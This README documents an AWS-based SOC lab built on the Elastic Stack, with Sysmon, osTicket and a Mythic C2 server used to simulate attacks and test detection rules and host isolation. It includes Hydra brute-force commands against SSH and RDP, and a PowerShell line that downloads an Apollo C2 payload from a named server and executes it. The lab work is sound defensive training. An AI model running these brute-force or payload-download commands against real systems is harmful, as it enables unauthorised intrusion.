# ELK SIEM SOC Lab - Complete End-to-End Security Operations Center

A production-like Security Operations Center (SOC) built on AWS using the Elastic Stack with automated threat detection, incident response, and endpoint protection.

## 📋 Table of Contents
- [Project Overview](#project-overview)
- [Architecture](#architecture)
- [Infrastructure Setup](#infrastructure-setup)
- [Components](#components)
- [Detection Rules](#detection-rules)
- [Incident Response Workflow](#incident-response-workflow)
- [Key Learnings](#key-learnings)
- [Results](#results)
- [Usage](#usage)

---

## 🎯 Project Overview

This project demonstrates a **complete, end-to-end SOC workflow** simulating real-world threat detection, investigation, and automated incident response. The lab includes:

✅ **Centralized SIEM** using Elastic Stack (Elasticsearch + Kibana)  
✅ **Real attack simulation** (SSH/RDP brute force, C2 malware)  
✅ **Automated threat detection** with custom KQL rules  
✅ **Ticketing system integration** (osTicket) for incident management  
✅ **Endpoint protection** with Elastic Defend  
✅ **Host isolation** - Automated response to threats  
✅ **Professional investigation workflow** - SOC analyst perspective  

---

## 🏗️ Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                      AWS ENVIRONMENT                         │
├─────────────────────────────────────────────────────────────┤
│                                                               │
│  ATTACKER (Kali Linux)                                       │
│         │                                                    │
│         ├──► SSH Brute Force ─┐                             │
│         │                      │                             │
│         ├──► RDP Brute Force ──┼──► WINDOWS VICTIM          │
│         │                      │    (EC2AMAZ-QPF036S)       │
│         └──► C2 Malware ───────┼──► Elastic Agent           │
│                                │    Elastic Defend          │
│                                │    Sysmon                  │
│                                │                             │
│  MYTHIC C2 SERVER              │    Event Logs              │
│  (Separate AWS Account)        │         │                  │
│  Elastic IP: 13.61.205.240     │         │                  │
│  Apollo Agent Callback ◄───────┘         │                  │
│                                          ▼                  │
│                                   ELASTIC AGENT             │
│                                   (Windows)                 │
│                                          │                  │
│                          ┌───────────────┼───────────────┐  │
│                          │               │               │  │
│                          ▼               ▼               ▼  │
│   ┌──────────────┐   ┌──────────────┐   ┌──────────────┐  │
│   │  ELASTICSEARCH  │   │ FLEET SERVER    │   │ LINUX AGENT │  │
│   │  (Port 9200)    │   │ (Port 8220)     │   │ (Ubuntu)    │  │
│   │  (ELK Server)   │   │ (SEPARATE)      │   │             │  │
│   │  8GB RAM        │   │ Agent Mgmt      │   │ SSH Logs    │  │
│   └────────┬────────┘   └────────┬────────┘   └──────┬──────┘  │
│            │                     │                   │        │
│            └─────────────────────┼───────────────────┘        │
│                                  │                            │
│                                  ▼                            │
│                  ┌────────────────────────────────┐           │
│                  │   KIBANA (Port 5601)           │           │
│                  │   (ELK Server)                 │           │
│                  │   Dashboards & Visualization   │           │
│                  │   Detection Rules              │           │
│                  │   Alerting                     │           │
│                  └────────────┬───────────────────┘           │
│                               │                               │
│                 Detection Rule Triggers                       │
│                               │                               │
│                               ▼                               │
│                ┌────────────────────────────────┐             │
│                │   osTicket Server              │             │
│                │   (Windows 2022 + XAMPP)       │             │
│                │   Port 80 (HTTP)               │             │
│                │   Ticket Management            │             │
│                └────────────────────────────────┘             │
│                                                               │
└─────────────────────────────────────────────────────────────┘
```

---

## 🔧 Infrastructure Setup

### EC2 Instances

| Instance | Type | OS | Purpose |
|----------|------|----|---------| 
| ELK Server (Elasticsearch + Kibana) | m7i.large | Ubuntu 24.04 LTS | Elasticsearch, Kibana |
| Fleet Server | t2.micro | Ubuntu 24.04 LTS | Agent management & enrollment |
| Linux Agent | t2.micro | Ubuntu 24.04 LTS | Log forwarding, SSH auth logs |
| Windows Victim | t3.micro | Windows Server 2022 | Elastic Agent, Defend, Sysmon |
| osTicket Server | t3.micro | Windows Server 2022 | Ticketing system, XAMPP |
| Mythic C2 | t2.micro | Ubuntu 24.04 LTS | Command & Control server |

### Key Ports

```
9200  - Elasticsearch
5601  - Kibana
8220  - Fleet Server
7443  - Mythic Web UI
3389  - RDP (Windows)
22    - SSH (Linux)
80    - HTTP (osTicket, C2)
3306  - MySQL
```

### Network Configuration

- **Security Groups**: Restrictive inbound rules, only necessary ports exposed
- **Elastic IPs**: Assigned to prevent IP drift on restarts
- **VPC**: Default VPC with proper subnet configuration
- **SSH Restrictions**: Port 22 restricted to specific IPs (no 0.0.0.0/0)

---

## 📦 Components

### 1. Elastic Stack (SIEM)

**Elasticsearch Configuration** (`/etc/elasticsearch/elasticsearch.yml`):
```yaml
network.host: 0.0.0.0
http.port: 9200
discovery.type: single-node
xpack.security.enabled: true
```

**Kibana Configuration** (`/etc/kibana/kibana.yml`):
```yaml
server.host: "0.0.0.0"
server.port: 5601
server.publicBaseUrl: "http://<ELK-IP>:5601"
elasticsearch.hosts: ["http://localhost:9200"]
```

**Installation**:
```bash
# Add Elastic repo
wget -qO - https://artifacts.elastic.co/GPG-KEY-elasticsearch | sudo apt-key add -
echo "deb https://artifacts.elastic.co/packages/8.x/apt stable main" | sudo tee -a /etc/apt/sources.list.d/elastic-8.x.list

# Install
sudo apt update
sudo apt install elasticsearch kibana -y

# Start services
sudo systemctl start elasticsearch
sudo systemctl start kibana
```

### 2. Fleet Server & Elastic Agents

**Fleet Server Setup** (Ubuntu):
```bash
cd ~/Mythic  # Or your preferred directory
wget https://artifacts.elastic.co/downloads/beats/elastic-agent/elastic-agent-9.4.2-linux-x86_64.tar.gz
tar xzf elastic-agent-9.4.2-linux-x86.tar.gz
cd elastic-agent-9.4.2-linux-x86_64

# Enroll as Fleet Server
sudo ./elastic-agent install --url=https://YOUR-ELK-IP:8220 \
  --enrollment-token=<TOKEN> \
  --insecure \
  --fleet-server-es=https://YOUR-ELK-IP:9200 \
  --fleet-server-service-token=<SERVICE-TOKEN> \
  -f
```

**Windows Agent Enrollment**:
```powershell
cd "C:\Program Files\Elastic\Agent"
.\elastic-agent.exe enroll --url=https://FLEET-SERVER-IP:8220 `
  --enrollment-token=<TOKEN> `
  --insecure `
  --force
Restart-Service "Elastic Agent"
```

**Linux Agent Enrollment**:
```bash
sudo elastic-agent enroll https://FLEET-SERVER-IP:8220 \
  --enrollment-token=<TOKEN> \
  --insecure
sudo systemctl restart elastic-agent
```

### 3. Sysmon Installation (Windows)

```powershell
# Download Sysmon
Invoke-WebRequest -Uri https://download.sysinternals.com/files/Sysmon.zip -OutFile Sysmon.zip
Expand-Archive Sysmon.zip -DestinationPath C:\Sysmon

# Install with config
C:\Sysmon\sysmon.exe -i C:\Sysmon\sysmonconfig-export.xml -accepteula
```

**Monitored Events**:
- Event 1: Process creation
- Event 3: Network connections
- Event 5001: Windows Defender disabled

### 4. osTicket Ticketing System

**Setup on Windows**:
```powershell
# Install XAMPP
# Download from: https://www.apachefriends.org/

# Configure Apache
# Edit: C:\xampp\apache\conf\httpd.conf
# Change: Listen 0.0.0.0:80

# Set MySQL root password
cd C:\xampp\mysql\bin
.\mysql -u root -e "ALTER USER 'root'@'localhost' IDENTIFIED BY 'osticket123';"

# Create osTicket database
.\mysql -u root -p
CREATE DATABASE osticket;
EXIT;

# Extract osTicket
# Download from: https://osticket.com/download/
# Extract to: C:\xampp\htdocs\osticket

# Access installer
# Navigate to: http://localhost/osticket/upload/setup/install.php
```

**phpMyAdmin Config** (`C:\xampp\phpmyadmin\config.inc.php`):
```php
$cfg['Servers'][$i]['user'] = 'root';
$cfg['Servers'][$i]['password'] = 'osticket123';
$cfg['Servers'][$i]['host'] = 'localhost';
```

**API Key Generation**:
- Admin Panel → Manage → API Keys
- Create new key with Kibana server IP
- Note: Each unique IP requires a unique API key

### 5. Elastic Defend (Endpoint Protection)

**Deployment**:
- Integrations → Elastic Defend
- Select Windows Policy
- Deploy to Windows endpoints

**Features Enabled**:
- Malware detection
- Prevention (blocking)
- Host isolation (automated response)

### 6. Mythic C2 (Simulated Attacker Infrastructure)

**Installation**:
```bash
git clone https://github.com/its-a-feature/Mythic
cd Mythic
sudo ./mythic-cli install

# Critical: Unbind RabbitMQ and Mythic for external callbacks
sudo ./mythic-cli config set mythic_server_bind_localhost_only false
sudo ./mythic-cli config set rabbitmq_bind_localhost_only false
sudo ./mythic-cli restart
```

**Apollo Agent Payload Configuration**:
- Download: Apollo v0.0.1.15
- HTTP C2 Profile: v0.0.3.2
- callback_host: `http://13.61.205.240` (Mythic IP)
- callback_port: `80`
- Payload name: `zoro.exe`

**Payload Delivery**:
```powershell
# Start Python HTTP server on Mythic server
python3 -m http.server 9999

# On victim Windows machine
Invoke-WebRequest -Uri http://13.61.205.240:9999/zoro.exe -OutFile "C:\Users\Public\Downloads\zoro.exe"
.\zoro.exe
```

---

## 🚨 Detection Rules

### 1. SSH Brute Force Detection

**Rule Name**: `ssh bruteforce attempt ubuntu`  
**Severity**: Medium (Risk score: 47)

**KQL Query**:
```kql
system.auth.ssh.event: failed and agent.name: ip-172-31-3-64 and user.name: "ubuntu" and system.auth.ssh.event: Failed
```

**Configuration**:
- Runs every: 1 minute
- Look-back time: 1 minute
- Threshold: 5+ failed attempts
- Required fields: `source.ip`, `user.name`
- Action: Create osTicket ticket

**Test Command**:
```bash
hydra -l ubuntu -P /tmp/passwords.txt -t 4 ssh://TARGET-IP
```

### 2. RDP Brute Force Detection

**Rule Name**: `rdp bruteforce attempt administrator`  
**Severity**: Medium (Risk score: 47)

**KQL Query**:
```kql
event.code: 4625 and winlog.event_data.TargetUserName: Administrator and winlog.event_data.FailureReason: "*logon failure*"
```

**Configuration**:
- Runs every: 1 minute
- Look-back time: 1 minute
- Threshold: 5+ failed attempts
- Action: Create osTicket ticket

**Test Command**:
```bash
hydra -l Administrator -P /tmp/passwords.txt -t 4 rdp://TARGET-IP
```

### 3. C2 Malware Detection (Apollo Agent)

**Rule Name**: `apollo c2 detection`  
**Severity**: Critical

**KQL Query**:
```kql
event.code: 1 and (winlog.event_data.Hashes: *73C4918E5994427685F466E45176F1FE3FFB79DA7840A21775A43DFFC447CBE7* or winlog.event_data.OriginalFileName: Apollo.exe)
```

**Detects**:
- Process creation of zoro.exe
- Command-line arguments
- Parent process information
- Current working directory
- File hash matching

**Enrichment**:
- Source IP
- User executing payload
- Hostname
- Timestamp

### 4. Malware Detection (Elastic Defend)

**Rule Name**: `malware detected - host isolation`  
**Severity**: Critical

**Triggers on**:
- File: `zoro.exe`
- Category: Malware/Unwanted software
- Action: Auto-isolate host

---

## 🔄 Incident Response Workflow

### Attack Simulation Flow

```
┌─────────────────────────────────────────────────────┐
│  1. ATTACK SIMULATION                               │
│     - SSH brute force from Kali Linux               │
│     - RDP brute force using Hydra                   │
│     - C2 malware execution (zoro.exe)               │
└─────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────┐
│  2. SYSMON LOG COLLECTION                           │
│     - Event 1: Process creation (zoro.exe)          │
│     - Event 3: Network connections (C2 callback)    │
│     - Event 5001: Defender disabled                 │
│     - Event 4625: Failed RDP logons                 │
└─────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────┐
│  3. ELASTIC AGENT SHIPS LOGS                        │
│     - Windows agent → Fleet Server → Elasticsearch  │
│     - Linux agent → Fleet Server → Elasticsearch    │
└─────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────┐
│  4. DETECTION RULES TRIGGER                         │
│     - SSH brute force rule matches (5+ failures)    │
│     - RDP brute force rule matches (5+ failures)    │
│     - C2 detection rule matches (process + hash)    │
│     - Malware detection (Elastic Defend)            │
└─────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────┐
│  5. AUTOMATED RESPONSE ACTIONS                      │
│     - Alert generated in Kibana                     │
│     - Webhook POST to osTicket API                  │
│     - Host isolation triggered                      │
│     - Network connectivity blocked                  │
└─────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────┐
│  6. INCIDENT TICKET CREATED                         │
│     - osTicket #XXXXXX created automatically        │
│     - Subject: Rule name                            │
│     - Description: Alert details                    │
│     - Priority: Based on severity                   │
│     - Assigned to: Support department               │
└─────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────┐
│  7. SOC ANALYST INVESTIGATION                       │
│     - Review ticket in osTicket                     │
│     - Investigate in Kibana Discover                │
│     - Analyze attack timeline                       │
│     - Correlate events across sources               │
│     - Document findings                             │
└─────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────┐
│  8. INCIDENT RESOLUTION                             │
│     - Containment: Host isolation (✅ automated)    │
│     - Eradication: Remove malware                   │
│     - Recovery: Release host isolation              │
│     - Remediation: Update detection rules           │
│     - Close ticket in osTicket                      │
└─────────────────────────────────────────────────────┘
```

### Manual Investigation Steps

1. **Alert Verification**
   - Check Kibana Alerts tab
   - Review alert details
   - Verify false positive status

2. **Evidence Collection**
   ```kql
   # Find all events from attacking IP
   source.ip: 81.163.20.41 and @timestamp: [now-24h TO now]
   
   # Process execution timeline
   event.code: 1 and host.name: EC2AMAZ-QPF036S
   
   # Network connections
   event.code: 3 and destination.ip: 13.61.205.240
   ```

3. **Threat Assessment**
   - IP reputation check
   - Attack success status
   - Compromised accounts
   - Data exfiltration indicators

4. **Documentation**
   - Timeline of events
   - Evidence summary
   - Incident severity
   - Recommended actions

---

## 🎓 Key Learnings

### 1. EC2 IP Management
- **Problem**: EC2 instances change public IPs on restart
- **Solution**: Assign Elastic IPs to prevent drift
- **Impact**: Eliminates need to reconfigure Fleet Server URLs, osTicket IPs, C2 callbacks

### 2. MySQL Connection Requirements
- **Problem**: phpMyAdmin couldn't connect to MySQL via public IP
- **Solution**: Use `localhost` instead of public IP for same-machine connections
- **Learning**: Database bindings are restricted by design for security

### 3. Mythic C2 Network Binding
- **Problem**: RabbitMQ and Mythic defaulted to localhost-only binding
- **Solution**: Unbind both services to allow external agent callbacks
- **Command**: `./mythic-cli config set mythic_server_bind_localhost_only false`

### 4. osTicket API Requirements
- **Problem**: 401 Unauthorized errors on webhook calls
- **Solution**: Create unique API key per IP (IP-restricted auth)
- **Note**: Each Kibana instance needs its own API key scoped to its IP

### 5. osTicket API Ticket Format
- **Problem**: 500 errors with simplified XML bodies
- **Solution**: Include full XML structure with all required fields:
  - `<ticket>` with attributes: `alert="true"`, `autorespond="true"`, `source="API"`
  - Required fields: `name`, `email`, `subject`, `message`, `phone`, `ip`

### 6. Host Isolation Impact
- **Problem**: Didn't anticipate RDP disconnection after isolation
- **Solution**: Understand that isolation blocks ALL network traffic (intentional)
- **Recovery**: Release isolation through Kibana or AWS EC2 Instance Connect

### 7. Detection Rule Tuning
- **Problem**: 5-minute scan interval meant 10-minute alert delay
- **Solution**: Reduce to 1-minute intervals for faster detection
- **Trade-off**: More frequent rule execution = higher CPU usage

### 8. Sysmon Event Selection
- **Problem**: Too many events generated by Sysmon
- **Solution**: Filter to high-value events (1, 3, 5001, 6, 8, 10, 11, 13, 14, 15, 17, 18, 19, 20, 21, 22, 26, 27, 28, 29)
- **Best Practice**: Start broad, refine based on environment

---

## 📊 Results

### Attacks Simulated & Detected

| Attack Type | Tool | Success | Detection | Automation |
|-------------|------|---------|-----------|-----------|
| SSH Brute Force | Hydra | ✅ Failed (no valid creds) | ✅ Rule triggered | ✅ Ticket created |
| RDP Brute Force | Hydra | ✅ Successful (Admin creds found) | ✅ Rule triggered | ✅ Ticket created |
| C2 Malware | Mythic Apollo | ✅ Callback success | ✅ Process + Network detected | ✅ Host isolated |
| Malware File | zoro.exe | ✅ Blocked by Defend | ✅ Elastic Defend alert | ✅ Auto-isolated |

### Dashboards Created

1. **Authentication Dashboard**
   - SSH failed/successful logins by country (4 maps)
   - Attack sources: China, India, USA, Netherlands
   - Timeline of authentication events

2. **Suspicious Activity Dashboard**
   - Process creation events (Event ID 1)
   - Network connections (Event ID 3)
   - Defender disabled events (Event ID 5001)
   - Detected: zoro.exe execution, C2 callback, Defender disable

3. **Endpoint Protection Dashboard**
   - Elastic Defend alerts
   - File quarantine actions
   - Host isolation status

### Tickets Generated

```
Total Tickets: 9
- SSH Brute Force: 4 tickets
- RDP Brute Force: 3 tickets
- Testing API: 2 tickets

Auto-created by alerts: 7
Manual creation: 2

Response: Automated ticket creation on detection
Timeline: Alert → Ticket: <2 minutes
```

---

## 🚀 Usage

### Starting the Lab

```bash
# 1. Verify all services are running
# ELK Server
ssh ubuntu@ELK-IP
sudo systemctl status elasticsearch
sudo systemctl status kibana

# Fleet Server (running as systemd service)
sudo systemctl status elastic-agent

# 2. Access Kibana
# Open browser: http://ELK-IP:5601

# 3. Access osTicket
# Open browser: http://OSTICKET-IP/osticket/upload/scp
# Login with credentials created during setup

# 4. Access Mythic C2 (if needed)
# Open browser: https://MYTHIC-IP:7443
```

### Running Attack Simulations

**SSH Brute Force**:
```bash
# From attacker machine (Linux/Kali)
hydra -l ubuntu -P /tmp/wordlist.txt -t 4 ssh://TARGET-LINUX-IP
```

**RDP Brute Force**:
```bash
# From attacker machine
hydra -l Administrator -P /tmp/wordlist.txt -t 4 rdp://TARGET-WINDOWS-IP
```

**C2 Malware Execution**:
```powershell
# On Windows victim
python3 -m http.server 9999  # On Mythic C2 server

# Download payload
Invoke-WebRequest -Uri http://MYTHIC-IP:9999/zoro.exe -OutFile "C:\Users\Public\Downloads\zoro.exe"

# Execute
.\zoro.exe

# Verify callback in Mythic Web UI
```

### Investigation Commands

**Discover Brute Force Events**:
```kql
system.auth.ssh.event: failed and user.name: ubuntu
```

**Timeline of C2 Execution**:
```kql
host.name: EC2AMAZ-QPF036S and @timestamp: [now-1h TO now] | sort @timestamp
```

**Network Connections to C2**:
```kql
destination.ip: 13.61.205.240 and event.code: 3
```

**Malware Detection Alerts**:
```kql
event.category: malware and file.name: zoro.exe
```

---

## 📝 Lessons Learned & Recommendations

### What Worked Well
✅ Multi-cloud approach (separate AWS account for C2)  
✅ Automated detection & response workflow  
✅ Webhook integration for ticketing  
✅ Host isolation for rapid containment  
✅ Comprehensive logging across Windows & Linux  

### Improvements for Production
- Implement multi-factor authentication (MFA)
- Use SSL/TLS for all communications
- Add backup/redundancy for critical systems
- Implement SOAR (Security Orchestration, Automation, Response)
- Add threat intel feeds for IP reputation
- Implement log retention policies (compliance)
- Set up centralized syslog server
- Use secret management (AWS Secrets Manager)

### Interview Talking Points

1. **End-to-End SIEM Implementation**
   - "Built complete SIEM from scratch on AWS"
   - "Configured centralized log collection across heterogeneous infrastructure"
   - "Created custom detection rules using KQL"

2. **Threat Detection & Investigation**
   - "Simulated real attacks (brute force, C2 malware)"
   - "Investigated incidents professionally with timeline analysis"
   - "Correlated events across multiple data sources"

3. **Automation & Response**
   - "Automated ticket creation from SIEM alerts"
   - "Implemented host isolation for rapid containment"
   - "Reduced alert-to-action time to <2 minutes"

4. **Infrastructure Management**
   - "Managed multi-instance AWS deployment"
   - "Troubleshot network connectivity issues"
   - "Optimized log collection and storage"

5. **Security Best Practices**
   - "Implemented principle of least privilege"
   - "Restricted SSH to specific IPs only"
   - "Used IP-scoped API keys for external integrations"

---

## 📚 Resources & References

### Elastic Stack Documentation
- [Elasticsearch Official Docs](https://www.elastic.co/guide/en/elasticsearch/reference/current/index.html)
- [Kibana Detection Rules](https://www.elastic.co/guide/en/security/current/detection-engine-overview.html)
- [KQL Query Language](https://www.elastic.co/guide/en/kibana/current/kuery-query.html)

### SIEM & SOC Resources
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [MITRE ATT&CK Framework](https://attack.mitre.org)
- [SANS Incident Handler's Handbook](https://www.sans.org)

### Tools Used
- [Mythic C2 Framework](https://github.com/its-a-feature/Mythic)
- [Hydra Brute Force](https://github.com/vanhauser-thc/thc-hydra)
- [Sysmon](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
- [osTicket](https://osticket.com)

---

## 📞 Contact & Support

For questions about this lab or SIEM implementation:
- Review the architecture diagram
- Check the troubleshooting section
- Consult Elastic documentation
- Test with smaller attacks first

---

## ⚖️ License

This project is for educational purposes. Use in authorized environments only.

---

**Last Updated**: June 27, 2026  
**Project Status**: Complete  
**Availability**: Production-ready for learning/demonstrations
